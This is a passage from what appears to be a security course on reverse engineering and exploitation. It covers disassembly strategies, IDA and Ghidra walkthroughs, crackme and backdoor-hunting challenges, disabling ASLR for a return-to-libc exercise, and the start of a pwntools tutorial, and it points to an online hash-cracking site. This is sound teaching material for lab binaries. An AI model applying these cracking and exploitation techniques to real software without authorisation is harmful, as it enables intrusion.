</span></span><span style=display:flex><span> <span style=color:#0000cf;font-weight:700>80491</span><span style=color:#000>b5</span><span style=color:#000;font-weight:700>:</span>       <span style=color:#000>f7</span>                      <span style=color:#000>.byte</span> <span style=color:#0000cf;font-weight:700>0xf7</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a40000>080491</span><span style=color:#000>b6</span> <span style=color:#a40000>&lt;</span><span style=color:#000>B</span><span style=color:#a40000>&gt;</span><span style=color:#000;font-weight:700>:</span>
</span></span><span style=display:flex><span> <span style=color:#a40000>80491</span><span style=color:#f57900>b6:</span>       <span style=color:#a40000>83</span> <span style=color:#000>ec</span> <span style=color:#0000cf;font-weight:700>0</span><span style=color:#000>c</span>                <span style=color:#000>sub</span>    <span style=color:#000>esp</span><span style=color:#000;font-weight:700>,</span><span style=color:#0000cf;font-weight:700>0xc</span>
</span></span></code></pre></div><p>If we restore the line where the binary is stripped, recompile and disassemble it once more, we see that this time, <code>objdump</code> gets completely lost when it encounters our <code>de ad c0 de</code> sequence. This is because, previously, it used symbols in the binary, such as <code>B</code>, to figure out where some of the real instructions started. Now, without the help of those symbols, <code>objdump</code> doesn&rsquo;t manage to output a coherent Assembly code.</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span> <span style=color:#a40000>804840</span><span style=color:#f57900>c:</span>       <span style=color:#000>eb</span> <span style=color:#0000cf;font-weight:700>09</span>                   <span style=color:#000>jmp</span>    <span style=color:#0000cf;font-weight:700>8048417</span> <span style=color:#000;font-weight:700>&lt;</span><span style=color:#000>__libc_start_main@plt</span><span style=color:#000;font-weight:700>+</span><span style=color:#0000cf;font-weight:700>0x127</span><span style=color:#000;font-weight:700>&gt;</span>
</span></span><span style=display:flex><span> <span style=color:#a40000>804840</span><span style=color:#f57900>e:</span>       <span style=color:#000>de</span> <span style=color:#000>ad</span> <span style=color:#000>c0</span> <span style=color:#000>de</span> <span style=color:#000>e9</span> <span style=color:#000>e8</span>       <span style=color:#000>fisubr</span> <span style=color:#000>WORD</span> <span style=color:#000>PTR</span> <span style=color:#000;font-weight:700>[</span><span style=color:#000>ebp-0x17162140</span><span style=color:#000;font-weight:700>]</span>
</span></span><span style=display:flex><span> <span style=color:#a40000>8048414:</span>       <span style=color:#a40000>7</span><span style=color:#000>b</span> <span style=color:#000>fb</span>                   <span style=color:#000>jnp</span>    <span style=color:#0000cf;font-weight:700>8048411</span> <span style=color:#000;font-weight:700>&lt;</span><span style=color:#000>__libc_start_main@plt</span><span style=color:#000;font-weight:700>+</span><span style=color:#0000cf;font-weight:700>0x121</span><span style=color:#000;font-weight:700>&gt;</span>
</span></span><span style=display:flex><span> <span style=color:#a40000>8048416:</span>       <span style=color:#000>f7</span> <span style=color:#0000cf;font-weight:700>83</span> <span style=color:#000>ec</span> <span style=color:#0000cf;font-weight:700>0</span><span style=color:#000>c</span> <span style=color:#0000cf;font-weight:700>68</span> <span style=color:#000>c0</span> <span style=color:#0000cf;font-weight:700>84</span>    <span style=color:#000>test</span>   <span style=color:#000>DWORD</span> <span style=color:#000>PTR</span> <span style=color:#000;font-weight:700>[</span><span style=color:#000>ebx-0x3f97f314</span><span style=color:#000;font-weight:700>],</span><span style=color:#0000cf;font-weight:700>0xe8080484</span>
</span></span><span style=display:flex><span> <span style=color:#a40000>804841</span><span style=color:#f57900>d:</span>       <span style=color:#a40000>04</span> <span style=color:#a40000>08</span> <span style=color:#000>e8</span> 
</span></span><span style=display:flex><span> <span style=color:#0000cf;font-weight:700>8048420</span><span style=color:#000;font-weight:700>:</span>       <span style=color:#000>ac</span>                      <span style=color:#000>lods</span>   <span style=color:#000>al</span><span style=color:#000;font-weight:700>,</span><span style=color:#000>BYTE</span> <span style=color:#000>PTR</span> <span style=color:#000>ds</span><span style=color:#000;font-weight:700>:[</span><span style=color:#000>esi</span><span style=color:#000;font-weight:700>]</span>
</span></span><span style=display:flex><span> <span style=color:#a40000>8048421:</span>       <span style=color:#000>fe</span>                      <span style=color:#000;font-weight:700>(</span><span style=color:#000>bad</span><span style=color:#000;font-weight:700>)</span>  
</span></span><span style=display:flex><span> <span style=color:#0000cf;font-weight:700>8048422</span><span style=color:#000;font-weight:700>:</span>       <span style=color:#000>ff</span>                      <span style=color:#000;font-weight:700>(</span><span style=color:#000>bad</span><span style=color:#000;font-weight:700>)</span>  
</span></span><span style=display:flex><span> <span style=color:#0000cf;font-weight:700>8048423</span><span style=color:#000;font-weight:700>:</span>       <span style=color:#000>ff</span> <span style=color:#0000cf;font-weight:700>83</span> <span style=color:#000>c4</span> <span style=color:#0000cf;font-weight:700>10</span> <span style=color:#000>b8</span> <span style=color:#000>ff</span>       <span style=color:#000>inc</span>    <span style=color:#000>DWORD</span> <span style=color:#000>PTR</span> <span style=color:#000;font-weight:700>[</span><span style=color:#000>ebx-0x47ef3c</span><span style=color:#000;font-weight:700>]</span>
</span></span><span style=display:flex><span> <span style=color:#a40000>8048429:</span>       <span style=color:#000>ff</span>                      <span style=color:#000;font-weight:700>(</span><span style=color:#000>bad</span><span style=color:#000;font-weight:700>)</span>  
</span></span><span style=display:flex><span> <span style=color:#0000cf;font-weight:700>804842</span><span style=color:#000>a</span><span style=color:#000;font-weight:700>:</span>       <span style=color:#000>ff</span>                      <span style=color:#000;font-weight:700>(</span><span style=color:#000>bad</span><span style=color:#000;font-weight:700>)</span>  
</span></span><span style=display:flex><span> <span style=color:#0000cf;font-weight:700>804842</span><span style=color:#000>b</span><span style=color:#000;font-weight:700>:</span>       <span style=color:#000>ff</span> <span style=color:#0000cf;font-weight:700>8</span><span style=color:#000>b</span> <span style=color:#0000cf;font-weight:700>4</span><span style=color:#000>d</span> <span style=color:#000>fc</span> <span style=color:#000>c9</span> <span style=color:#0000cf;font-weight:700>8</span><span style=color:#000>d</span>       <span style=color:#000>dec</span>    <span style=color:#000>DWORD</span> <span style=color:#000>PTR</span> <span style=color:#000;font-weight:700>[</span><span style=color:#000>ebx-0x723603b3</span><span style=color:#000;font-weight:700>]</span>
</span></span><span style=display:flex><span> <span style=color:#a40000>8048431:</span>       <span style=color:#a40000>61</span>                      <span style=color:#000>popa</span>   
</span></span><span style=display:flex><span> <span style=color:#0000cf;font-weight:700>8048432</span><span style=color:#000;font-weight:700>:</span>       <span style=color:#000>fc</span>                      <span style=color:#000>cld</span>    
</span></span><span style=display:flex><span> <span style=color:#0000cf;font-weight:700>8048433</span><span style=color:#000;font-weight:700>:</span>       <span style=color:#000>c3</span>                      <span style=color:#000>ret</span>
</span></span></code></pre></div><p>In order to avoid traps like the one showcased above, we need to use smarter disassembly techniques, such as <em>Recursive Traversal</em>.</p><h2 id=recursive-traversal>Recursive Traversal</h2><p>Note that, in the example above, the misleading instruction is never executed. If it were, the program would crash after receiving a <code>SIGILL</code> signal and after outputting <code>Illegal instruction (core dumped)</code>, because the CPU would not know how to decode that particular instruction. But if we run the binary above, we notice that it doesn&rsquo;t crash. So that instruction is nothing but dead code. As a result, it&rsquo;s useless to us no matter what it means. And this is where <em>Recursive Traversal</em> comes in.</p><p>This strategy doesn&rsquo;t start the disassembly at the beginning of the <code>.text</code> section, but at the entry point (the address of the <code>_start</code> symbol) and disassembles the instructions linearly, while also considering <strong>jumps</strong>. Thus, when encountering code branches, the algorithm follows them and creates what&rsquo;s called a <strong>Control Flow Graph (CFG)</strong>, where each node is called a <strong>Basic Block (BB)</strong> and is made up of instructions that are always executed in that order, regardless of conditional jumps or function calls. Take a look at the CFG below and note the BBs and the jumps that make up the arches. The code comes from the <code>hyp3rs3rv3r</code> binary, which can be found <a href=https://github.com/hexcellents/sss-exploit/tree/master/sessions/04-static-analysis/activities/02-tutorial-ida-time/src>here</a>. To make things harder, this executable was also stripped.
<img src=assets/fork_xref_2.png alt="CFG created by IDA"></p><p>In conclusion, we can look at the CFG as being a DFS (recursive) traversal of the code, separated into BBs, with <code>ret</code> instructions acting as <em>back edges</em>.</p><h1 id=ida-and-ghidra>IDA and Ghidra</h1><p>The tool that we used in order to generate the image above is called <a href=https://www.hex-rays.com/products/ida/support/download_freeware/>IDA</a>. Next, we&rsquo;ll learn how to use it!</p><p>We&rsquo;ll showcase the functionalities of IDA by disassembling the <code>hyp3rs3rv3r</code> binary. The first screen you are presented with is the following:<br><img src=assets/ida_initial_screen.png alt="Initial IDA Screen"></p><p>Main components:</p><ul><li>On the left you have the <strong>Function window</strong> with the list of identified subroutines, functions or external functions called by the binary. They are color coded according to the legend right above it.</li><li>Under it you have a graph overview of the view presented on the right.</li><li>On the right you have multiple tabs, with the <strong>Function summary</strong> selected in the IDA-view. We will not be using this. Instead, we will switch to the complete <strong>Graph View</strong> of functions by pressing the spacebar. This graph is the CFG we mentioned earlier.</li></ul><p>Upon pressing spacebar and navigating in the <strong>Function window</strong> to functions that are not coloured (meaning they are part of this binary) we get the following view:<br><img src=assets/ida_first_view.png alt="IDA - First View"></p><p>When reversing binaries, we will see this particular Assembly construct a lot, as it is the standard one generated by <code>gcc</code>. Remember from <a href=https://github.com/hexcellents/sss-exploit/tree/master/sessions/03-executable-file-formats>Session 02</a> that <a href=refspecs.linuxbase.org/LSB_3.1.1/LSB-Core-generic/LSB-Core-generic/baselib---libc-start-main-.html>__libc_start_main</a> is the wrapper that calls <code>main</code>. We now rename the last argument pushed on the stack to main. Press <code>n</code> and enter the new name. Now you have your first function identified. Click on it to see what <code>main</code> does:<br><img src=assets/ida_main.png alt=main></p><p>Note how the execution is neatly layed out in the CFG view. If you look at the left panel you can see the complete view. The execution is divided because of conditional and unconditional branches. Let&rsquo;s figure out what happens by analyzing the assembly code:</p><p>First we have the function prologue, stack alignment and stack allocation:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#000>push</span>    <span style=color:#000>ebp</span>
</span></span><span style=display:flex><span><span style=color:#000>mov</span>     <span style=color:#000>ebp</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000>esp</span>
</span></span><span style=display:flex><span><span style=color:#000>and</span>     <span style=color:#000>esp</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>0</span><span style=color:#000>FFFFFFF0h</span>
</span></span><span style=display:flex><span><span style=color:#000>sub</span>     <span style=color:#000>esp</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>450</span><span style=color:#000>h</span>
</span></span></code></pre></div><p>Next, a variable on the stack is initialized to 1. If you click on <code>434h</code> it will become highlighted and you can scroll through the whole function to see where it&rsquo;s used later. We&rsquo;ll ignore this for now.</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#000>mov</span>     <span style=color:#000>dword</span> <span style=color:#000>ptr</span> <span style=color:#000;font-weight:700>[</span><span style=color:#000>esp</span><span style=color:#a40000>+</span><span style=color:#0000cf;font-weight:700>434</span><span style=color:#000>h</span><span style=color:#000;font-weight:700>],</span> <span style=color:#0000cf;font-weight:700>1</span>
</span></span></code></pre></div><p>Next, we see the first branching:</p><pre tabindex=0><code>cmp     [ebp+arg_0], 2
jz      short loc_8049068
</code></pre><hr><p><strong>Remember!</strong></p><p>On 32 bit systems, <code>[ebp + 0]</code> is the saved <code>ebp</code>, <code>[ebp + 4]</code> is the return address and <code>[ebp + 8]</code> is the first argument to the current function. IDA follows a slightly different naming convention: <code>[ebp + 8]</code> is named <code>[ebp+arg_0]</code>. <code>[ebp + 12]</code> is named <code>[ebp+arg_4]</code> etc. You can rename those <code>arg_*</code> constructs if you want, anyway.</p><hr><p>So it&rsquo;s referring to the first argument: <code>argc</code>. Basically, what it does is:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#204a87;font-weight:700>if</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>argc</span> <span style=color:#ce5c00;font-weight:700>==</span> <span style=color:#0000cf;font-weight:700>2</span><span style=color:#000;font-weight:700>)</span> <span style=color:#000;font-weight:700>{</span>
</span></span><span style=display:flex><span>	<span style=color:#204a87;font-weight:700>goto</span> <span style=color:#000>loc_8049068</span>
</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>}</span> <span style=color:#204a87;font-weight:700>else</span> <span style=color:#000;font-weight:700>{</span>
</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>....</span>
</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>}</span>
</span></span></code></pre></div><p>What does the <code>else</code> branch do?</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#000>mov</span>     <span style=color:#000>eax</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000;font-weight:700>[</span><span style=color:#000>ebp</span><span style=color:#a40000>+</span><span style=color:#000>arg_4</span><span style=color:#000;font-weight:700>]</span>
</span></span><span style=display:flex><span><span style=color:#000>mov</span>     <span style=color:#000>eax</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000;font-weight:700>[</span><span style=color:#000>eax</span><span style=color:#000;font-weight:700>]</span>
</span></span><span style=display:flex><span><span style=color:#000>mov</span>     <span style=color:#000;font-weight:700>[</span><span style=color:#000>esp</span><span style=color:#a40000>+</span><span style=color:#0000cf;font-weight:700>4</span><span style=color:#000;font-weight:700>],</span> <span style=color:#000>eax</span>
</span></span><span style=display:flex><span><span style=color:#000>mov</span>     <span style=color:#000>dword</span> <span style=color:#000>ptr</span> <span style=color:#000;font-weight:700>[</span><span style=color:#000>esp</span><span style=color:#000;font-weight:700>],</span> <span style=color:#000>offset</span> <span style=color:#000>format</span> <span style=color:#8f5902;font-style:italic>; &#34;Usage: %s &lt;banner_file&gt;\n&#34;
</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic></span><span style=color:#000>call</span>    <span style=color:#000>_printf</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#000>mov</span>     <span style=color:#000>dword</span> <span style=color:#000>ptr</span> <span style=color:#000;font-weight:700>[</span><span style=color:#000>esp</span><span style=color:#000;font-weight:700>],</span> <span style=color:#0000cf;font-weight:700>0</span> <span style=color:#8f5902;font-style:italic>; status
</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic></span><span style=color:#000>call</span>    <span style=color:#000>_exit</span>
</span></span></code></pre></div><p>It&rsquo;s pretty straightforward if you remember the tasks from <a href=https://github.com/hexcellents/sss-exploit/tree/master/sessions/03-executable-file-formats>Session 02</a>. The second argument (<code>argv</code>) is dereferenced and pushed on the stack along with a format string. Then <code>printf</code> is called. Next, <code>exit</code> is called with a status of 0.</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#204a87;font-weight:700>if</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>argc</span> <span style=color:#ce5c00;font-weight:700>==</span> <span style=color:#0000cf;font-weight:700>2</span><span style=color:#000;font-weight:700>)</span> <span style=color:#000;font-weight:700>{</span>
</span></span><span style=display:flex><span>	<span style=color:#204a87;font-weight:700>goto</span> <span style=color:#000>loc_8049068</span>
</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>}</span> <span style=color:#204a87;font-weight:700>else</span> <span style=color:#000;font-weight:700>{</span>
</span></span><span style=display:flex><span>	<span style=color:#000>printf</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;%s &lt;banner_file&gt;</span><span style=color:#4e9a06>\n</span><span style=color:#4e9a06>&#34;</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000>argv</span><span style=color:#000;font-weight:700>[</span><span style=color:#0000cf;font-weight:700>0</span><span style=color:#000;font-weight:700>]);</span>
</span></span><span style=display:flex><span>	<span style=color:#000>exit</span><span style=color:#000;font-weight:700>(</span><span style=color:#0000cf;font-weight:700>0</span><span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>}</span>
</span></span></code></pre></div><p>Now let&rsquo;s do something a bit more advanced: we want to identify the 2 commands that the server accepts by using static analysis. How do we approach this problem as fast as possible? We already know that the server accepts multiple clients. It can do this through forking. Let&rsquo;s see where <code>fork</code> is called in the program. First find the <code>fork</code> function on the left panel and select it. Now you see a stub to it from the <code>PLT</code> section. We want to find all locations in the program that call this function. You can achieve this by obtaining all the <strong>cross-references (xrefs)</strong> to it by pressing <code>x</code>. You should get the following screen:<br><img src=assets/fork_xref_1.png alt="fork cross-references 1"></p><p>Click that location and you will get to the forking point:<br><img src=assets/fork_xref_2.png alt="fork cross-references 2"></p><p>You can see that the return value is stored on the stack at <code>[esp+438h]</code>, some error checking (<code>perror</code> and <code>exit</code>) is done and then the return value is checked for 0 (as we traditionally do for <code>fork</code> calls). The child will execute <code>sub_8048ED7</code> and the parent will loop back. You can rename <code>sub_8048ED7</code> to something more legible such as <code>handle_child_process</code>
In this function you can now clearly see the two commands and which function is called for each:<br><img src=assets/handle_child_process.png alt=handle_child_process></p><p>It looks like the one on the left, <code>sub_8048B0B</code> handles the <code>LIST</code> command so we rename it to <code>handle_LIST</code>. As expected, it calls <code>opendir</code> and <code>readdir</code> to read all the files in the current directory, then writes them to the socket.<br><img src=assets/handle_LIST.png alt=handle_LIST></p><h2 id=ida-tips--tricks>IDA tips & tricks</h2><ul><li>Saving progress is disabled for the trial version. However, you can save a limited (but useful) subset of your work using <code>File -> Produce File -> Dump database to IDC file</code> and then load it next time using <code>File -> Script File</code>.</li><li>If you close some windows and don&rsquo;t know how to get them back you can reset the layout using <code>Windows->Reset Desktop</code>.</li><li>If you want to return to the previous view you can press <code>Escape</code>.</li><li>When you want to view code as in <code>objdump</code> you only need to press <code>Spacebar</code> once. And then again to return to CFG mode.</li><li>If there is a hex value and you want to convert it to decimal (or back) press <code>h</code>.</li><li>Converting hex/dec values to <em>ASCII</em>: press <code>r</code>.</li><li>If you want to write comments next to an instruction or a function press <code>:</code>.</li></ul><h2 id=ida-pro-and-ghidra>IDA Pro and Ghidra</h2><p>IDA Pro is installed on the Kali virtual machine. The main difference between it and the free version is that the Pro one can also <strong>decompile</strong> the code based on the CFGs listed above. This will come in extremely useful as we hack more and more binaries.</p><p>Another tool that is capable of decompiling the code in an executable is <a href=https://ghidra-sre.org/>Ghidra</a>. One advantage of Ghidra over IDA is that Ghidra displays both the C and the Assembly code side by side. This allows us to correlate the two and reap the benefits of both of them at the same time.</p><h1 id=c>C++</h1><p>Things look slightly different when we try to hack executables that have been compiled from C++ code, instead of C. The difference comes from the way symbols (method symbols in particular) are handled by C++ compilers. Let&rsquo;s disassemble the code below and see how its symbols look:</p><pre tabindex=0><code class=language-code data-lang=code>#include &lt;iostream&gt;
using namespace std;
int main()
{
	cout &lt;&lt; &#34;Hello world&#34; &lt;&lt; endl;
	return 0;
}
</code></pre><p>Disassembling it in IDA looks familiar at first
<img src=assets/ida_c%2B%2B_start.png alt="IDA _start"></p><p>But then the fun starts:
<img src=assets/ida_c%2B%2B_main.png alt="IDA main"></p><p>As we can see, all symbols look almost as if they were encrypted. In fact, this process is called <strong>name mangling</strong>. If we take a closer look at them, however, we can distinguish some clues about those function calls, for example. The first one contains the sequences <code>char_traits</code> and <code>basic_ostream</code>, the former being a C++ abstraction for string operations, while the latter is a base class for output operators, such as <code>&lt;&lt;</code>.</p><p>IDA can demangle strings such as the ones above by itself. Some recommended settings (you may prefer something different) are the following:</p><ul><li><code>Options -> Demangled names</code></li><li>Show demangled C++ names as <code>Names</code></li><li><code>Setup short names</code></li><li>Click <code>Only main name</code></li></ul><p>These settings only display the important classes and namespaces that make up each method, like this:<br><img src=assets/ida_c%2B%2B_demangled.png alt="IDA demangled"></p><h1 id=further-reading>Further reading</h1><p>More information about name mangling can be obtained at:</p><ul><li><a href=https://en.wikipedia.org/wiki/Name_mangling>https://en.wikipedia.org/wiki/Name_mangling</a></li><li>on demand demangling: <a href=http://demangler.com/>http://demangler.com/</a> or c++filt</li></ul><p>You can find out more information about the internals of C++ in general, using the following references:</p><ul><li><a href=https://ocw.cs.pub.ro/courses/cpl/labs/06>https://ocw.cs.pub.ro/courses/cpl/labs/06</a> (in Romanian)</li><li><a href=https://www.blackhat.com/presentations/bh-dc-07/Sabanal_Yason/Paper/bh-dc-07-Sabanal_Yason-WP.pdf>https://www.blackhat.com/presentations/bh-dc-07/Sabanal_Yason/Paper/bh-dc-07-Sabanal_Yason-WP.pdf</a></li><li><a href=http://www.hexblog.com/wp-content/uploads/2011/08/Recon-2011-Skochinsky.pdf>http://www.hexblog.com/wp-content/uploads/2011/08/Recon-2011-Skochinsky.pdf</a></li></ul><h1 id=challenges>Challenges</h1><h2 id=04-crypto_crackme>04. crypto_crackme</h2><p>The <code>crypto_crackme</code> binary is an application that asks for a secret and uses it to decrypt a message. In order to solve this task, you have to retrieve the message.</p><ul><li>Open the binary using IDA and determine the program control flow. What is it doing after fetching the secret? It seems to be consuming a lot of CPU cycles. If possible, use IDA to patch the program and reduce the execution time of the application. Use &lsquo;&lsquo;Edit -> Patch program -> Change byte&mldr;&rsquo;&rsquo;</li><li>Next, it looks like the program tries to verify if the secret provided is correct. Where is the secret stored? Is it stored in plain text? Find out what the validation algorithm is.</li><li>Now break it and retrieve the message!</li></ul><hr><p><strong>Important!</strong></p><p>Unfortunately, the virtual machine doesn&rsquo;t support the libssl1.0.0 version of SSL library. Use the library files in the task archive and run the executable using:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#000>LD_LIBRARY_PATH</span><span style=color:#ce5c00;font-weight:700>=</span>. ./crypto_crackme
</span></span></code></pre></div><p>You can break password hashes (including SHA1) on <a href=https://crackstation.net/>CrackStation</a>.</p><hr><h2 id=05-broken>05. broken</h2><p>The <code>broken</code> binary is asking you for the correct password. Investigate the binary and provide it with the correct password. If you provided the correct password the message <code>%%That's correct! The password is '...'%%</code>.</p><h2 id=06-hyp3rs3rv3r>06. hyp3rs3rv3r</h2><p>Investigate the <code>hyp3rs3rv3r</code> binary and find out where the backdoor function is. Note that since it&rsquo;s not directly called, IDA doesn&rsquo;t think of it as a procedure, so it won&rsquo;t come up on the left pane. Figure out a way around this. When you find that code block you can press <code>p</code> on the first instruction to help IDA see it as a procedure.</p><details><summary>Tip</summary><p>In order to exploit the vulnerability in Ubuntu, you should use netcat-traditional. You can switch from netcat-openbsd to netcat-traditional using the steps described <a href=https://stackoverflow.com/questions/10065993/how-to-switch-to-netcat-traditional-in-ubuntu>here</a>.</p></details></div><div class=td-content style=page-break-before:always><h1 id=pg-8f5c31e10ee88a0594545152800351dc>12 -</h1><p>This exploit works with ASLR disabled. To disable ASLR (it&rsquo;s enabled by default on Linux) use:</p><pre tabindex=0><code>setarch x86_64 -R /bin/bash
</code></pre><p>We find the non-randomized address of the <code>puts</code> function in the standard C library by using GDB:</p><pre tabindex=0><code>$ gdb ./vuln
Reading symbols from ./vuln...done.
(gdb) start
Temporary breakpoint 1 at 0x40059e: file vuln.c, line 13.
Starting program: /home/razvan/projects/ctf/sss/sss-exploit-internal.git/sessions/12-bypassing-mitigations/activities/03-tutorial-bypass-dep-no-aslr-libc/vuln

Temporary breakpoint 1, main () at vuln.c:13
13              puts(&#34;Hello&#34;);
(gdb) p puts
$1 = {int (const char *)} 0x7ffff7a64a30 &lt;_IO_puts&gt;
</code></pre></div><div class=td-content style=page-break-before:always><h1 id=pg-239075f45b393a08894ffc3bfdda8d8e>13 -</h1><p>Assume ASLR disabled. To disable ASLR (it&rsquo;s enabled by default on Linux) use:</p><pre tabindex=0><code>setarch x86_64 -R /bin/bash
</code></pre></div><div class=td-content style=page-break-before:always><h1 id=pg-fcff5975079be7b17175350208fb9932>14 -</h1><p>ASLR is enabled for this challenge.</p></div><div class=td-content style=page-break-before:always><h1 id=pg-eb5b6809ffd9ca9d2e8bd64485ba35aa>15 -</h1><h1 id=pwntools-tutorial>Pwntools Tutorial</h1><hr><p>Even though pwntools is an excellent CTF framework, it is also an exploit development library. It was developed by Gallopsled, a European CTF team, under the context that exploit developers have been writing the same tools over and over again with different variations. Pwntools comes to level the playing field and bring together developers to create a common framework of tools.</p><h2 id=installation>Installation</h2><hr><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ pip install -U pwntools
</span></span></code></pre></div><h2 id=local-and-remote-io>Local and remote I/O</h2><hr><p>Pwntools enables you to dynamically interact (through scripting) with either local or remote processes, as follows:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#000>IP</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#4e9a06>&#39;10.11.12.13&#39;</span>
</span></span><span style=display:flex><span><span style=color:#000>PORT</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#0000cf;font-weight:700>1337</span>
</span></span><span style=display:flex><span><span style=color:#000>local</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#204a87;font-weight:700>False</span>
</span></span><span style=display:flex><span><span style=color:#204a87;font-weight:700>if</span> <span style=color:#204a87;font-weight:700>not</span> <span style=color:#000>local</span><span style=color:#000;font-weight:700>:</span>
</span></span><span style=display:flex><span>    <span style=color:#000>io</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>remote</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>IP</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000>PORT</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span><span style=color:#204a87;font-weight:700>else</span><span style=color:#000;font-weight:700>:</span>
</span></span><span style=display:flex><span>    <span style=color:#000>io</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>process</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#39;/path/to/binary&#39;</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#000>io</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>interactive</span><span style=color:#000;font-weight:700>()</span>
</span></span></code></pre></div><p>We can send and receive data from a local or remote process via <code>send</code>, <code>sendline</code>, <code>recv</code>, <code>recvline</code>, <code>recvlines</code> and <code>recvuntil</code>.</p><p>Let&rsquo;s construct a complete example in which we interact with a local process.</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#8f5902;font-style:italic>#include</span> <span style=color:#8f5902;font-style:italic>&lt;stdio.h&gt;</span><span style=color:#8f5902;font-style:italic>
</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic></span>
</span></span><span style=display:flex><span><span style=color:#204a87;font-weight:700>int</span> <span style=color:#000>main</span><span style=color:#000;font-weight:700>(</span><span style=color:#204a87;font-weight:700>int</span> <span style=color:#000>argc</span><span style=color:#000;font-weight:700>,</span> <span style=color:#204a87;font-weight:700>char</span><span style=color:#ce5c00;font-weight:700>*</span> <span style=color:#000>argv</span><span style=color:#000;font-weight:700>[])</span>
</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>{</span>
</span></span><span style=display:flex><span>	<span style=color:#204a87;font-weight:700>char</span> <span style=color:#000>flag</span><span style=color:#000;font-weight:700>[</span><span style=color:#0000cf;font-weight:700>10</span><span style=color:#000;font-weight:700>]</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000;font-weight:700>{</span><span style=color:#4e9a06>&#39;S&#39;</span><span style=color:#000;font-weight:700>,</span> <span style=color:#4e9a06>&#39;E&#39;</span><span style=color:#000;font-weight:700>,</span> <span style=color:#4e9a06>&#39;C&#39;</span><span style=color:#000;font-weight:700>,</span> <span style=color:#4e9a06>&#39;R&#39;</span><span style=color:#000;font-weight:700>,</span> <span style=color:#4e9a06>&#39;E&#39;</span><span style=color:#000;font-weight:700>,</span> <span style=color:#4e9a06>&#39;T&#39;</span><span style=color:#000;font-weight:700>,</span> <span style=color:#4e9a06>&#39;F&#39;</span><span style=color:#000;font-weight:700>,</span> <span style=color:#4e9a06>&#39;L&#39;</span><span style=color:#000;font-weight:700>,</span> <span style=color:#4e9a06>&#39;A&#39;</span><span style=color:#000;font-weight:700>,</span> <span style=color:#4e9a06>&#39;G&#39;</span><span style=color:#000;font-weight:700>};</span>
